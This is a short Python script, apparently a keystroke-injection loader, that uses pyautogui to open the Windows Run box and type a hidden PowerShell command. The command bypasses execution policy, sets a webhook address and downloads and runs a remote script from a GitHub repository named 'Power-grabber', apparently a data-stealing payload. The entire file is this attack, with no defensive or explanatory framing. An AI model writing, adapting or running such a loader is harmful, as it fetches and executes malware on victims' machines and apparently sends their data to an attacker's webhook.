import time
import subprocess
import pyautogui
time.sleep(1)
pyautogui.hotkey('win', 'r')
time.sleep(0.75)
pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex")
pyautogui.press('enter')
